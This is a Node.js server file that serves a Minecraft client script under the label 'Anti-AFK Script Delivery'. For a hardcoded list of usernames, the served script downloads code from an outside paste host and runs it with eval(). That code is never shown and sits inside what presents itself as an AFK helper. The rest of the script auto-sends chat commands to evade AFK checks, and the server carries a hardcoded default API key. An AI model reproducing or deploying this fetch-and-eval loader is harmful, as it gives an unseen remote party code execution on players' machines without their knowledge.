const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-321',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,autobuy',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());

// Логирование
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        res.status(403).json({ error: 'Access denied' });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для скрипта - ИСПРАВЛЕННАЯ ВЕРСИЯ
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {

// Method to send silent user-only message
function sendUserMessage(message) {
    try {
        var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
        var TextBuilder = Java.type("ru.nedan.neverapi.etc.TextBuilder");
        var class_124 = Java.type("net.minecraft.class_124");
        
        ChatUtility.sendMessage(
            new TextBuilder()
                .append(message)
                .build()
        );
    } catch(e) {
        // Fallback to console if needed
        print("USER MESSAGE: " + message);
    }
}

// Send initialization message
sendUserMessage("§eОбновлен: §c28.08.2025");
sendUserMessage("§aДобавлено:");
sendUserMessage("§9[📨] Новая защита скрипта");
sendUserMessage("§6§l---------------");
sendUserMessage("§b§lУдачного пользования!");
sendUserMessage("§b§l-Zr3");
    
    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();

    // Проверяем разрешенные имена
    if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
        try {
    // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
    var url = new java.net.URL("https://i.e-z.host/p/raw/upg6sy072a");
    var connection = url.openConnection();
    var inputStream = connection.getInputStream();
    var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
    var stringBuilder = new java.lang.StringBuilder();
    var line;

    while ((line = reader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }

    reader.close();
    inputStream.close();

    var externalScript = stringBuilder.toString();
    eval(externalScript);

} catch (e) {
    java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
}

var someCondition = true;  // Example condition

if (someCondition) {
    java.lang.System.out.println("hello world");
} else {
    java.lang.System.out.println("X");
}

// Global variable to track if we're sending commands
var isSendingCommands = false;
var afkDetected = false;

// Single event handler for message events
on("ru.nedan.neverapi.event.impl.EventMessage", function(event) {
    var message = event.getMessage();

     if (message === "[⚠] Данной команды не существует") {
        chat("/an604")
    }

    if (message === "Данная команда недоступна в режиме AFK") {
        afkDetected = true;
    }
});

// Periodic check with repeat() (make sure repeat is supported)
repeat(function() {
    if (afkDetected && !isSendingCommands) {
        isSendingCommands = true;
        afkDetected = false;

        chat("/hub");

        // Use a delayed async call instead of sleep if possible,
        // but if not, keep sleep as last resort.
        try {
            java.lang.Thread.sleep(250);
        } catch (ex) {
            java.lang.System.err.println("Sleep interrupted: " + ex);
        }

        chat("/an604");

        // Short pause before resetting flag
        try {
            java.lang.Thread.sleep(50);
        } catch (ex) {
            java.lang.System.err.println("Sleep interrupted: " + ex);
        }

        isSendingCommands = false;
    }
}, 200);

})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Anti-AFK Server',
        version: '1.0.0'
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

app.get('/', (req, res) => {
    res.json({
        service: 'Anti-AFK Script Delivery',
        version: '1.0.0',
        status: 'operational'
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'healthy' });
});

// ==================== ОБРАБОТКА ОШИБОК ====================

app.use('*', (req, res) => {
    res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('✅ Anti-AFK Server started on port', CONFIG.PORT);
    console.log('🔒 Protected endpoint: /api/script');
    console.log('🌐 Status endpoint: /api/status');
});
